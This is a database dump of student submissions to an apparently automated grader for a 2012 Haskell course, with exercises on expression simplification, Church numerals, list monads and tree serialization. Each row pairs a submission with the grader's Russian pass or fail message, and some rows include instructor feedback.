(3964, 99, '3742311', '2012-11-21 23:00:36', 1, '<html>\r\n\r\n    <head>\r\n\r\n        <title>Task 26-1</title>\r\n\r\n        <script language=''javascript''>\r\n\r\n            var diff = function(expr) {\r\n\r\n                switch (expr.type) {\r\n\r\n                case ''X'':\r\n\r\n                    return {\r\n\r\n                        type  : ''N'',\r\n\r\n                        value : 1\r\n\r\n                    };\r\n\r\n                case ''N'':\r\n\r\n                    return {\r\n\r\n                        type  : ''N'',\r\n\r\n                        value : 0\r\n\r\n                    }\r\n\r\n                case ''Add'':\r\n\r\n                    return {\r\n\r\n                        type  : ''Add'',\r\n\r\n                        expr1 : diff(expr.expr1),\r\n\r\n                        expr2 : diff(expr.expr2)\r\n\r\n                    }\r\n\r\n                case ''Mult'':\r\n\r\n                    return {\r\n\r\n                        type  : ''Add'',\r\n\r\n                        expr1 : {\r\n\r\n                            type  : ''Mult'',\r\n\r\n                            expr1 : diff(expr.expr1),\r\n\r\n                            expr2 : expr.expr2\r\n\r\n                        },\r\n\r\n                        expr2 : {\r\n\r\n                            type  : ''Mult'',\r\n\r\n                            expr1 : expr.expr1,\r\n\r\n                            expr2 : diff(expr.expr2)\r\n\r\n                        }\r\n\r\n                    }\r\n\r\n                default:\r\n\r\n                    return;\r\n\r\n                }\r\n\r\n            }\r\n\r\n\r\n\r\n            var show = function(expr) {\r\n\r\n                switch (expr.type) {\r\n\r\n                case ''X'':\r\n\r\n                    return ''X'';\r\n\r\n                case ''N'':\r\n\r\n                    return ''(N '' + expr.value + '')'';\r\n\r\n                case ''Add'':\r\n\r\n                    return ''(Add '' + show(expr.expr1) + '' '' + show(expr.expr2) + '')'';\r\n\r\n                case ''Mult'':\r\n\r\n                    return ''(Mult '' + show(expr.expr1) + '' '' + show(expr.expr2) + '')'';\r\n\r\n                default:\r\n\r\n                    return;\r\n\r\n                }\r\n\r\n            }\r\n\r\n\r\n\r\n            var expr = {\r\n\r\n                type  : ''Mult'',\r\n\r\n                expr1 : {\r\n\r\n                    type : ''X''\r\n\r\n                },\r\n\r\n                expr2 : {\r\n\r\n                    type : ''X''\r\n\r\n                }\r\n\r\n            }\r\n\r\n\r\n\r\n            alert(''Expr: '' + show(expr) + ''\r\nDiff expr: '' + show(diff(expr)));\r\n\r\n        </script>\r\n\r\n    </head>\r\n\r\n</html>\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3965, 103, '374969', '2012-11-21 23:02:23', 0, 'import Data.List\r\nimport Data.Maybe\r\n\r\nfindInLists lst cond = (find (	 -> True)) $ catMaybes $ (map $ find cond) lst', 'Не удалось вычислить выражение "findInLists [[1,2], [2,8,7]] (>5) 0", проверьте правильность синтаксиса'),
(3966, 101, '5656962', '2012-11-21 23:03:24', 1, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr\r\n\r\n	deriving (Show)\r\n\r\n\r\n\r\nrules (Mult _ (N 0)) = (N 0)\r\n\r\nrules (Mult(N 0) _) = (N 0)\r\n\r\nrules expr = expr\r\n\r\n\r\n\r\nsimplify (Add x y) = rules(Add (simplify x) (simplify y))\r\n\r\nsimplify (Mult x y) = rules(Mult (simplify x) (simplify y))\r\n\r\nsimplify expr = expr\r\n\r\n\r\n\r\n\r\n\r\n \r\n', '<br/>Тесты успешно пройдены!'),
(3967, 103, '374969', '2012-11-21 23:03:31', 0, 'import Data.List\r\nimport Data.Maybe\r\n\r\nfindInLists lst cond z = (find (	 -> True)) $ catMaybes $ (map $ find cond) lst', 'Выражение имеет неправильное значение: findInLists [[1,2], [2,8,7]] (>5) 0'),
(3968, 103, '374969', '2012-11-21 23:08:16', 2, 'import Data.List\r\nimport Data.Maybe\r\n\r\nfindInLists lst cond z = if (isJust tmp) then  fromJust tmp else z where tmp = (find (x -> True)) $ catMaybes $ (map $ find cond) lst\r\n   --- Нет, это не по условию.. Тут надо было использовать не стандартный find, а тот find, который мы\r\n   --- обсуждали на занятии, с failure cintinuation\r\n', '<br/>Тесты успешно пройдены!'),
(3969, 98, '3742311', '2012-11-21 23:31:33', 0, 'data Tree = Node Char Tree Tree | Empty\r\n\r\ntoStr Empty = ''e''\r\ntoStr (Node c t1 t2) = ''n'':c:(toStr t1) ++ (toStr t2)\r\n\r\nfromStrTmp ''e'':s = (Empty, s)\r\nfromStrTmp ''n'':c:s = let (t1, str1) = fromStrTmp s in let (t2, str2) = fromStrTmp str1 in ((Node c t1 t2), str2)\r\n\r\nfromStr s = let (t, _) = fromStrTmp s in t', 'Не удалось вычислить выражение "fromStr(toStr (Node ''a'' (Node ''b'' Empty Empty) Empty))", проверьте правильность синтаксиса'),
(3970, 98, '3742311', '2012-11-21 23:34:45', 0, 'data Tree = Node Char Tree Tree | Empty\r\n\r\ntoStr Empty = "e"\r\ntoStr (Node c t1 t2) = ''n'':c:(toStr t1) ++ (toStr t2)\r\n\r\nfromStrTmp ''e'':s = (Empty, s)\r\nfromStrTmp ''n'':c:s = let (t1, str1) = fromStrTmp s in let (t2, str2) = fromStrTmp str1 in ((Node c t1 t2), str2)\r\n\r\nfromStr s = let (t, _) = fromStrTmp s in t', 'Не удалось вычислить выражение "fromStr(toStr (Node ''a'' (Node ''b'' Empty Empty) Empty))", проверьте правильность синтаксиса'),
(3971, 104, '374969', '2012-11-21 23:46:34', 1, 'doubleEven lst = lst >>= y -> if even y then [y,y] else [y]', '<br/>Тесты успешно пройдены!'),
(3972, 98, '3742311', '2012-11-21 23:48:30', 0, 'data Tree = Node Char Tree Tree | Empty\r\n\r\ntoStr Empty = "e"\r\ntoStr (Node c t1 t2) = ''n'':c:(toStr t1) ++ (toStr t2)\r\n\r\nfromStrTmp ''e'':s = (Empty, s)\r\nfromStrTmp ''n'':c:s = let (t1, str1) = (fromStrTmp s) in let (t2, str2) = (fromStrTmp str1) in ((Node c t1 t2), str2)\r\n\r\nfromStr s = let (t, _) = fromStrTmp s in t', 'Не удалось вычислить выражение "fromStr(toStr (Node ''a'' (Node ''b'' Empty Empty) Empty))", проверьте правильность синтаксиса'),
(3973, 105, '374969', '2012-11-21 23:53:27', 1, 'cartesian lst1 lst2 = lst1 >>= x -> lst2 >>= y -> [(x, y)]', '<br/>Тесты успешно пройдены!'),
(3974, 107, '3742311', '2012-11-21 23:59:52', 0, 'data LogExpr = And LogExpr LogExpr | Or LogExpr LogExpr | Not LogExpr | T | F | X\r\n\r\neval T _ = True\r\neval F _ = False\r\neval X c = eval c\r\neval (Not l) c = not (eval l c)\r\neval (And l1 l2) c = (eval l1 c) && (eval l2 c)\r\neval (Or l1 l2) c = (eval l1 c) || (eval l2 c)\r\n\r\ninstance Eq LogExpr where\r\n  l1 == l2 = (eval l1 T) == (eval l2 T) && (eval l1 F) == (eval l2 F)', 'Не удалось вычислить выражение "Or X (Not X) == T", проверьте правильность синтаксиса'),
(3975, 104, 'sromanov', '2012-11-22 00:05:24', 1, 'doubleEven xs = xs >>= x -> if x `mod` 2 == 0 then [x,x] else [x]', '<br/>Тесты успешно пройдены!'),
(3976, 105, 'sromanov', '2012-11-22 00:10:20', 1, 'cartesian xs ys = xs >>= x -> ys >>= y -> [(x,y)]', '<br/>Тесты успешно пройдены!'),
(3977, 100, '374969', '2012-11-22 00:22:22', 1, 'h count 1 diff = [[x] | x <- [1..count], diff x]\r\nh count element diff = [ a:b | a <- [1..count],b <- h count (element-1) (x -> diff x && x /= a), diff a]\r\n   --- ну только diff a лучше поставить сразу после a <- [1..count]. Тогда перебор будет гораздо меньше.\r\nallDiffLists count elements = h count elements (x -> True)', '<br/>Тесты успешно пройдены!'),
(3978, 103, '51559263', '2012-11-22 00:36:57', 1, 'find _ [] err = err\r\n\r\n\r\n\r\nfind cond ( x : xs ) err = if cond x\r\n\r\n                           then x\r\n\r\n						   else find cond xs err\r\n\r\n\r\n\r\n						   \r\n\r\nfindInLists [] _ err = err\r\n\r\n						   \r\n\r\nfindInLists ( l : ls ) cond err = find cond l ( findInLists ls cond err )  \r\n', '<br/>Тесты успешно пройдены!'),
(3979, 101, '51559263', '2012-11-22 01:46:38', 1, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr deriving (Show, Eq)\r\n\r\n\r\n\r\nsimplify X = X\r\n\r\n\r\n\r\nsimplify ( N n ) = N n\r\n\r\n\r\n\r\nsimplify ( Add e1 e2 ) = Add ( simplify e1 ) ( simplify e2 )\r\n\r\n\r\n\r\nsimplify ( Mult _ (N 0) ) = N 0\r\n\r\n\r\n\r\nsimplify ( Mult (N 0) _ ) = N 0\r\n\r\n\r\n\r\nsimplify ( Mult e1 e2 ) = let \r\n\r\n                              se1 = simplify e1\r\n\r\n			      se2 = simplify e2\r\n\r\n						  in \r\n\r\n						     if e1 == se1 && e2 == se2\r\n\r\n						     then Mult e1 e2\r\n\r\n							 else simplify ( Mult se1 se2 )\r\n\r\n \r\n', '<br/>Тесты успешно пройдены!'),
(3980, 100, 'erwert', '2012-11-22 02:55:39', 0, 'AllDiffLists n k = AllDiffList n k (x -> True)\n\nallDiffList n 0 cond = [[]]\n\nallDiffList n k cond = [h:hs | h <- [1..n], cond h, hs <- allDiffList n (k-1) (x -> cond x && (x /= h))]\n\n\n', 'Не удалось вычислить выражение "length (allDiffLists 3 3)", проверьте правильность синтаксиса'),
(3981, 100, 'erwert', '2012-11-22 03:02:41', 1, 'allDiffLists n k = allDiffList n k (x -> True)\r\n\r\nallDiffList n 0 cond = [[]]\r\n\r\nallDiffList n k cond = [h:hs | h <- [1..n], cond h, hs <- allDiffList n (k-1) (x -> cond x && (x /= h))]', '<br/>Тесты успешно пройдены!'),
(3982, 101, 'erwert', '2012-11-22 03:03:22', 1, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr deriving(Show, Eq)\r\n\r\n\r\n\r\nsimplify X = X\r\n\r\nsimplify (N a) = N a\r\n\r\nsimplify (Mult (N 0) r) = N 0\r\n\r\nsimplify (Mult l (N 0)) = N 0\r\n\r\nsimplify (Mult a b) = if x == (N 0) || y == (N 0) then N 0 else Mult x y\r\n\r\n    where \r\n\r\n        x = simplify a\r\n\r\n        y = simplify b\r\n\r\nsimplify (Add a b) = Add (simplify a) (simplify b)\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3983, 102, 'erwert', '2012-11-22 03:03:36', 1, 'findMajor h = find h (sum h)\r\n\r\n\r\n\r\nfind [] s = Nothing\r\n\r\nfind (h:hs) s\r\n\r\n    | h >= s - h = Just h\r\n\r\n    | otherwise = find hs s\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3984, 103, 'erwert', '2012-11-22 03:25:17', 0, 'find cond l e = foldl (a b -> if cond b then b else a) e l\n\nfindInLists [] cond e = e\n\nfindInLists (h:hs) cond e = find cond h (findInLists hs cond e)\n\n\n', 'Выражение имеет неправильное значение: findInLists [[1,2], [2,8,7]] (>5) 0'),
(3985, 103, 'erwert', '2012-11-22 03:29:30', 1, 'find cond [] e = e\r\n\r\nfind cond (h:hs) e \r\n\r\n    | cond h = h\r\n\r\n    | otherwise = find cond hs e\r\n\r\nfindInLists [] cond e = e\r\n\r\nfindInLists (h:hs) cond e = find cond h (findInLists hs cond e)\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3986, 104, 'erwert', '2012-11-22 03:39:41', 1, 'doubleEven l = l >>= (x -> if mod x 2 == 0 then [x, x] else [x])\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3987, 105, 'erwert', '2012-11-22 03:50:47', 0, 'cartesian l1 l2 = l1 >>= (x -> foldl (a b -> (x,b):a) [] l2)\n\n\n', 'Выражение имеет неправильное значение: cartesian [1,2] [3,4]'),
(3988, 105, 'erwert', '2012-11-22 03:54:44', 1, 'cartesian l1 l2 = l1 >>= (x ->  foldr (a b -> (x,a):b) [] l\r\n   --- ОК, но можно было и вместо foldr использовать >>=\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3989, 103, '533223', '2012-11-22 04:57:31', 0, 'find cond [] err = err\r\nfind cond (x:xs) err = if cond x then x else find cond xs err\r\n\r\nfindInLists (x:xs) cond err = find cond x (findInLists xs cond err)', 'Не удалось вычислить выражение "findInLists [[1,8,2], [2,7]] (>10) 0", проверьте правильность синтаксиса'),
(3990, 103, '533223', '2012-11-22 05:02:45', 1, 'find cond [] err = err\r\nfind cond (x:xs) err = if cond x then x else find cond xs err\r\nfindInLists [] _ err = err\r\nfindInLists (x:xs) cond err = find cond x (findInLists xs cond err)', '<br/>Тесты успешно пройдены!'),
(3991, 104, '533223', '2012-11-22 05:07:23', 1, 'doubleEven xs = xs>>= x -> if rem x 2 == 0 then [x,x] else [x]', '<br/>Тесты успешно пройдены!'),
(3992, 103, '5656962', '2012-11-22 05:40:57', 1, 'find cond [] err = err\r\n\r\nfind cond (x:xs) err = if cond x then x else find cond xs err\r\n\r\n\r\n\r\nfindInLists [] cond err = err\r\n\r\nfindInLists (x:xs) cond err = find cond x (findInLists xs cond err)\r\n', '<br/>Тесты успешно пройдены!'),
(3993, 100, '5656962', '2012-11-22 05:54:50', 1, 'allDiffLists1 n 0 cond = [[]]\r\n\r\nallDiffLists1 n k cond = [i:xs | i <- [1..n], cond i, xs <- allDiffLists1 n (k-1) (	 -> cond t && t /= i)]\r\n\r\n\r\n\r\nallDiffLists n k = allDiffLists1 n k (	 -> True)\r\n', '<br/>Тесты успешно пройдены!'),
(3994, 103, '3431532', '2012-11-22 06:29:28', 0, 'findd cont cond [] = cont\r\nfindd cont cond (x:xs) | cond x == True = x\r\nfindd cont cond (x:xs) = findd cont cond xs\r\n\r\n\r\nfindInLists [] cond = 0\r\nfindInLists (x:xs) cond  = findd (findInLists xs cond) cond x', 'Не удалось вычислить выражение "findInLists [[1,2], [2,8,7]] (>5) 0", проверьте правильность синтаксиса'),
(3995, 103, '442421', '2012-11-22 07:04:23', 1, '--к сожалению, отсутствовал на занятии и не очень понимаю задачу, на данный момент такое решение\r\n  --- Давайте я вас попрошу написать findInList используя этот ваш find но не используя\r\n  --- никакие встроенные функции (с помощью рекурсии). Можете при этом использовать if.\r\n  --- Не то чтобы это было очень принципиально, просто для единообразия требований ко всем.. \r\n\r\n--не уверен, что опять понял, что требуется, но не использовал встроенных функций  \r\n\r\nfind [] b n = n\r\nfind (x:xs) b n = if b x then x else find xs b n \r\n\r\nfindInLists [] b n = n\r\nfindInLists (x:xs) b n = findInLists'' (find x b n) xs b n\r\nfindInLists'' f xs b n = if f/=n then f else findInLists xs b n', '<br/>Тесты успешно пройдены!'),
(3996, 103, '3431532', '2012-11-22 07:11:56', 1, 'findd cont cond [] = cont\r\nfindd cont cond (x:xs) | cond x == True = x\r\nfindd cont cond (x:xs) = findd cont cond xs\r\n\r\n\r\nfindInLists [] cond ret = ret\r\nfindInLists (x:xs) cond ret  = findd (findInLists xs cond ret) cond x', '<br/>Тесты успешно пройдены!'),
(3997, 103, '374969', '2012-11-22 07:28:02', 0, 'find []      cond failp = failp\r\nfind (hd:tl) cond failp = if  cond hd then hd else find tl cond failp\r\n\r\n\r\nfindInLists lst cond failp = find lst (x -> failp = find x cond failp) failp', 'Не удалось вычислить выражение "findInLists [[1,2], [2,8,7]] (>5) 0", проверьте правильность синтаксиса'),
(3998, 103, '374969', '2012-11-22 07:40:40', 1, 'find []      cond failp = failp\r\nfind (hd:tl) cond failp = if  cond hd then hd else find tl cond failp\r\n\r\n\r\nfindInLists lst cond failp = find (map (x -> find x cond failp) lst)  (x -> x /= failp) failp', '<br/>Тесты успешно пройдены!'),
(3999, 102, '355679', '2012-11-22 07:59:00', 1, 'import Data.Maybe\r\n\r\n\r\n\r\nfindMajor xs = let {\r\n\r\n		filtered = filter (x -> x > (sum xs) - x) xs\r\n\r\n	} in (\r\n\r\n		if length filtered > 0 then\r\n\r\n			Just (head filtered)\r\n\r\n		else\r\n\r\n			Nothing\r\n\r\n	)\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(4000, 101, '355679', '2012-11-22 08:08:33', 0, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr deriving Show\n\n\n\neval X x = x\n\neval (N n) x = n\n\neval (Add e1 e2) x = eval e1 x + eval e2 x\n\neval (Mult e1 e2) x = eval e1 x * eval e2 x\n\n\n\ndiff X = N 1\n\ndiff (N _) = N 0\n\ndiff (Add e1 e2) = Add (diff e1) (diff e2)\n\ndiff (Mult e1 e2) = Add (Mult (diff e1) e2) (Mult e1 (diff e2))\n\n\n\nsimplify (Mult _ (N 0)) = N 0\n\nsimplify (Mult (N 0) _) = N 0\n\nsimplify (Mult e1 e2) = simplify (Mult (simplify e1) (simplify e2))\n\nsimplify (Add e1 e2) = Add (simplify e1) (simplify e2)\n\nsimplify X = X\n\nsimplify (N n) = N n\n\n\n\ntest1 = show (simplify (Add (Mult X (N 0)) X)) == "Add (N 0) X"\n\ntest2 = show (simplify (Mult X (Mult X (N 0)))) == "N 0"\n\n\n', 'Не удалось вычислить выражение "simplify (Mult X X)", проверьте правильность синтаксиса'),
(4001, 101, '355679', '2012-11-22 08:18:22', 1, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr deriving (Show, Eq)\r\n\r\n\r\n\r\neval X x = x\r\n\r\neval (N n) x = n\r\n\r\neval (Add e1 e2) x = eval e1 x + eval e2 x\r\n\r\neval (Mult e1 e2) x = eval e1 x * eval e2 x\r\n\r\n\r\n\r\ndiff X = N 1\r\n\r\ndiff (N _) = N 0\r\n\r\ndiff (Add e1 e2) = Add (diff e1) (diff e2)\r\n\r\ndiff (Mult e1 e2) = Add (Mult (diff e1) e2) (Mult e1 (diff e2))\r\n\r\n\r\n\r\nsimplify (Mult _ (N 0)) = N 0\r\n\r\nsimplify (Mult (N 0) _) = N 0\r\n\r\n\r\n\r\nsimplify (Mult e1 e2) = let {\r\n\r\n		simple1 = simplify e1;\r\n\r\n		simple2 = simplify e2;\r\n\r\n		smthChanged = e1 /= simple1 || e2 /= simple2;\r\n\r\n	} in (\r\n\r\n		if smthChanged then\r\n\r\n			simplify (Mult simple1 simple2)\r\n\r\n		else\r\n\r\n			Mult e1 e2\r\n\r\n	)\r\n\r\n\r\n\r\nsimplify (Add e1 e2) = Add (simplify e1) (simplify e2)\r\n\r\nsimplify X = X\r\n\r\nsimplify (N n) = N n\r\n\r\n\r\n\r\ntest1 = show (simplify (Add (Mult X (N 0)) X)) == "Add (N 0) X"\r\n\r\ntest2 = show (simplify (Mult X (Mult X (N 0)))) == "N 0"\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(4002, 100, '355679', '2012-11-22 08:49:22', 1, 'allDiffLists n k = allDiffLists'' n k (const False) \r\n\r\n\r\n\r\nallDiffLists'' _ 0 _ = [[]]\r\n\r\nallDiffLists'' n k alreadyContains =\r\n\r\n	foldr\r\n\r\n		(x res ->\r\n\r\n			foldr\r\n\r\n				(xs res1 -> (x:xs):res1 )\r\n\r\n				res\r\n\r\n				(allDiffLists'' n (k - 1) (y -> alreadyContains y || y == x))\r\n\r\n		)\r\n\r\n		[]\r\n\r\n		(filter (not.alreadyContains) [1..n])\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(4003, 97, 'erwert', '2012-11-22 10:08:57', 0, 'checkBrackets l = (foldl (a b -> if b == ''('' then (1:a) else if b == ''['' then (2:a) else if (b == '']'' && a /= [] && head a == 2) || (b =='')'' && a /= [] && head a == 1) then tail a else (3:a)) [] l) == []', '<br/>Тесты успешно пройдены!'),
(4004, 107, '355679', '2012-11-22 17:07:08', 1, 'data LogExpr = X | T | F | And LogExpr LogExpr | Or LogExpr LogExpr | Not LogExpr deriving Show\r\n\r\n\r\n\r\neval X bool = bool\r\n\r\neval T _ = True\r\n\r\neval F _ = False\r\n\r\neval (And a b) bool = eval a bool && eval b bool\r\n\r\neval (Or a b) bool = eval a bool || eval b bool\r\n\r\neval (Not a) bool = not (eval a bool)\r\n\r\n\r\n\r\ninstance Eq (LogExpr) where\r\n\r\n	a == b = eval a True == eval b True && eval a False == eval b False\r\n\r\n\r\n\r\ntest1 = (Or X (Not X) == T) == True\r\n\r\ntest2 = (Or X (And X (Not X)) == T) == False\r\n\r\ntest = test1 && test2\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(4005, 98, 'hasp', '2012-11-22 18:04:45', 1, 'data Tree = Empty | Node Char Tree Tree deriving (Show, Eq )\r\n\r\ntoStr Empty = "Empty"\r\ntoStr (Node c l r) = (''['':(toStr l)) ++ (c:(toStr r)) ++ "]"\r\n\r\nparseNode (''E'':''m'':''p'':''t'':''y'':'']'':xs) = (Empty, xs)\r\nparseNode (''E'':''m'':''p'':''t'':''y'':xs) = (Empty, xs)\r\nparseNode (''['':xs) = let (n,h:cb:tl) = parseNode xs ; (n2, tl2) = parseNode (if cb == '']'' then tl else (cb:tl)) in (Node h n n2, tl2)\r\n\r\nfromStr s = fst (parseNode s)', '<br/>Тесты успешно пройдены!'),
(4006, 116, '44060', '2012-11-22 21:21:22', 1, 'toInt churchN = churchN (+1) 0', '<br/>Тесты успешно пройдены!'),
(4007, 117, '44060', '2012-11-22 21:22:58', 0, 'inc churchN = (f x -> f (churchN f x))', 'Не удалось вычислить выражение "let c3 f x = f (f x) in toInt (inc c3)", проверьте правильность синтаксиса'),
(4008, 117, '44060', '2012-11-22 21:25:14', 1, 'toInt churchN = churchN (+1) 0\r\ninc churchN = (f x -> f (churchN f x))\r\n', '<br/>Тесты успешно пройдены!'),
(4009, 113, '44060', '2012-11-22 21:27:24', 1, 'sum_cps [] cont = cont 0\r\nsum_cps (x:xs) cont = sum_cps xs (cont.(+x))', '<br/>Тесты успешно пройдены!'),
(4010, 114, '44060', '2012-11-22 21:31:52', 1, 'triangle1 n = [1..n] >>=  i -> [1..i]\r\n\r\ntriangle2 n = do i<-[1..n];\r\n				[1..i]', '<br/>Тесты успешно пройдены!'),
(4011, 115, '472848', '2012-11-22 21:35:22', 0, 'find cond [] = []\r\nfind cond (x:xs) = if cond x then [x] else find cond xs\r\n\r\nf li = let res = (find (<5) li)++(find (>10) li)++(find (/=3) li) in if (length res < 3) then [] else [sum res]', 'Выражение имеет неправильное значение: f [7, 6, 4, 3, 20, 15, 9] '),
(4012, 115, '472848', '2012-11-22 21:35:37', 1, 'find cond [] = []\r\nfind cond (x:xs) = if cond x then [x] else find cond xs\r\n\r\nf li = let res = (find (<5) li)++(find (>10) li)++(find (/=7) li) in if (length res < 3) then [] else [sum res]', '<br/>Тесты успешно пройдены!'),
(4013, 118, '472848', '2012-11-22 21:57:09', 0, 'find cond (x:xs) = if cond x then (x, xs) else find cond xs\r\n\r\n(>>>) f1 f2 li = let (x,xs) = f1 li in f2 xs\r\n\r\nf = find (>3) >>> find (>3) ', 'Выражение имеет неправильное значение: let f = find (>3) >>> find (>3) in f [1, 3, 5, 2, 20, 25, 2]'),
(4014, 118, '472848', '2012-11-22 21:57:32', 0, 'find cond (x:xs) = if cond x then (x, xs) else find cond xs\r\n\r\n(>>>) f1 f2 li = let (x,xs) = f1 li in f2 xs', 'Выражение имеет неправильное значение: let f = find (>3) >>> find (>3) in f [1, 3, 5, 2, 20, 25, 2]'),
(4015, 118, '472848', '2012-11-22 21:58:03', 1, 'find cond (x:xs) = if cond x then (x, xs) else find cond xs\r\n\r\n(>>>) f1 f2 li = let (x,xs) = f1 li in f2 xs\r\n\r\nf = find (>3) >>> find (>3) ', 'Выражение имеет неправильное значение: let f = find (>3) >>> find (>3) in f [1, 3, 5, 2, 20, 25, 2]'),
(4016, 113, '472848', '2012-11-22 22:44:59', 1, 'sum_cps [] f = f 0\r\nsum_cps (x:xs) f = sum_cps xs (f.(+x))', '<br/>Тесты успешно пройдены!'),
(4017, 111, '472848', '2012-11-22 22:56:33', 0, 'data Expr = Var String | N Integer | Add Expr Expr | Mult Expr Expr\r\n\r\neval (N i) _ = i\r\neval (Var st) ((var, val):li) = if (var == st) then val else eval (Var st) li\r\neval (Add e1 e2) li = (eval e1 li) + (eval e2 li)\r\neval (Mult e1 e2) li = (eval e1 li) * (eval e2 li)', '<br/>Тесты успешно пройдены!'),
(4018, 112, '472848', '2012-11-22 23:03:54', 1, 'data Expr = Var String | N Integer | Add Expr Expr | Mult Expr Expr | Let String Integer Expr\r\n\r\neval (N i) _ = i\r\neval (Var st) ((var, val):li) = if (var == st) then val else eval (Var st) li\r\neval (Add e1 e2) li = (eval e1 li) + (eval e2 li)\r\neval (Mult e1 e2) li = (eval e1 li) * (eval e2 li)\r\neval (Let st i e) li = eval e ((st,i):li)', 'Выражение имеет неправильное значение: eval (Let [''x''] 10 (Mult (Var [''x'']) (Var [''y'']))) [([''y''], 2)]'),
(4019, 116, '472848', '2012-11-22 23:23:34', 1, 'toInt g = g (+1) 0', '<br/>Тесты успешно пройдены!'),
(4020, 117, '472848', '2012-11-22 23:32:27', 0, 'inc g = (f x -> f (g f x))', 'Не удалось вычислить выражение "let c3 f x = f (f x) in toInt (inc c3)", проверьте правильность синтаксиса'),
(4021, 117, '472848', '2012-11-22 23:33:00', 1, 'toInt g = g (+1) 0\r\n\r\ninc g = (f x -> f (g f x))', '<br/>Тесты успешно пройдены!'),
(4022, 107, '3742311', '2012-11-22 23:51:38', 1, 'data LogExpr = And LogExpr LogExpr | Or LogExpr LogExpr | Not LogExpr | T | F | X\r\n\r\neval T _ = True\r\neval F _ = False\r\neval X c = eval c c\r\neval (Not l) c = not (eval l c)\r\neval (And l1 l2) c = (eval l1 c) && (eval l2 c)\r\neval (Or l1 l2) c = (eval l1 c) || (eval l2 c)\r\n\r\ninstance Eq LogExpr where\r\n  l1 == l2 = (eval l1 T) == (eval l2 T) && (eval l1 F) == (eval l2 F)\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(4023, 98, '3742311', '2012-11-23 00:06:27', 0, 'data Tree = Node Char Tree Tree | Empty\r\n\r\ntoStr Empty = "e"\r\ntoStr (Node c t1 t2) = ''n'':c:(toStr t1) ++ (toStr t2)\r\n\r\nfromStrTmp (''e'':s) = (Empty, s)\r\nfromStrTmp (''n'':c:s) = let (t1, str1) = (fromStrTmp s) in let (t2, str2) = (fromStrTmp str1) in ((Node c t1 t2), str2)\r\n\r\nfromStr s = let (t, _) = fromStrTmp s in t', 'Не удалось вычислить выражение "fromStr(toStr (Node ''a'' (Node ''b'' Empty Empty) Empty))", проверьте правильность синтаксиса'),
(4024, 98, '3742311', '2012-11-23 00:38:41', 1, 'data Tree = Node Char Tree Tree | Empty deriving Show\r\n\r\ntoStr Empty = "e"\r\ntoStr (Node c t1 t2) = ''n'':c:(toStr t1) ++ (toStr t2)\r\n\r\nfromStrTmp (''e'':s) = (Empty, s)\r\nfromStrTmp (''n'':c:s) = let (t1, str1) = (fromStrTmp s) in let (t2, str2) = (fromStrTmp str1) in ((Node c t1 t2), str2)\r\n\r\nfromStr s = let (t, _) = fromStrTmp s in t', '<br/>Тесты успешно пройдены!'),
(4025, 111, '3742311', '2012-11-23 00:49:07', 0, 'data Expr = Add Expr Expr | Mult Expr Expr | N Integer | Var [Char]\r\n\r\nfirst _ [] err = err\r\nfirst cond (h:t) err = if (cond h) then h else first cond t err\r\n\r\neval (N i) _ = i\r\neval (Add e1 e2) s = (eval e1 s) + (eval e2 s)\r\neval (Mult e1 e2) s = (eval e1 s) * (eval e2 s)\r\neval (Var x) s = let (_, v) = first ((p, z) -> p == x) s 0 in v', 'Не удалось вычислить выражение "eval (Add (Var [''x'']) (Mult (Var [''y'']) (N 3))) [([''x''], 5), ([''y''], 8)]", проверьте правильность синтаксиса'),
(4026, 118, '517309', '2012-11-23 03:45:33', 1, 'find cond (x:xs) = if cond x then (x, xs) else find cond xs\r\n\r\n(>>>) f1 f2 li = let (x,xs) = f1 li in f2 xs\r\n\r\nf = find (>3) >>> find (>3) ', '<br/>Тесты успешно пройдены!'),
(4027, 117, '3431532', '2012-11-23 04:16:44', 0, 'inc f = f (x -> x+1) 1', 'Не удалось вычислить выражение "let c3 f x = f (f x) in toInt (inc c3)", проверьте правильность синтаксиса'),
(4028, 116, '3431532', '2012-11-23 04:19:20', 1, 'toInt f = f (x -> x+1) 0', '<br/>Тесты успешно пройдены!'),
(4029, 117, '3431532', '2012-11-23 04:37:31', 1, 'toInt f = f (x -> x+1) 0\r\n  --- Засчитано, но это не совсем то. На самом деле можно это сделать гораздо проще..\r\n\r\ninc f = church ((toInt f)+1)\r\n\r\nchurch 0 = f x -> x\r\nchurch n = f x -> f (church (n-1) f x)', '<br/>Тесты успешно пройдены!'),
(4030, 98, '3431532', '2012-11-23 05:58:28', 0, 'data Node = Node Char Node Node | Empty deriving Show\r\n\r\ntoStr Empty = []\r\ntoStr (Node x l r) = x : toStr l ++ toStr r\r\n\r\nfromStr = foldl (flip insert) Empty\r\n\r\n\r\ninsert a Empty = Node a Empty Empty\r\ninsert a (Node x l r) = Node x (insert a l) r', 'Выражение имеет неправильное значение: fromStr(toStr(Node ''a'' (Node ''b''  Empty Empty) (Node ''b''  Empty Empty) ))'),
(4031, 98, '3431532', '2012-11-23 07:01:43', 0, 'data Node = Node Char Node Node | Empty deriving Show\r\n\r\ntoStr Empty  =  "-"\r\ntoStr (Node x l r)   =  "<" ++ [x] ++ toStr l ++ "|" ++ toStr r ++ ">"\r\n\r\nfromStrr (''<'':x:xs)       =  [(Node x l r, u) | (l, ''|'':t) <- fromStrr xs,\r\n                                              (r, ''>'':u) <- fromStrr t]\r\n\r\nfromStrr s            	   =  [ if head s == ''-'' then (Empty, tail s) else (Node (head s) Empty Empty, tail s)  ]\r\n\r\nfromStr xs = head (map ((x,y) -> x) (fromStrr xs))', '<br/>Тесты успешно пройдены!'),
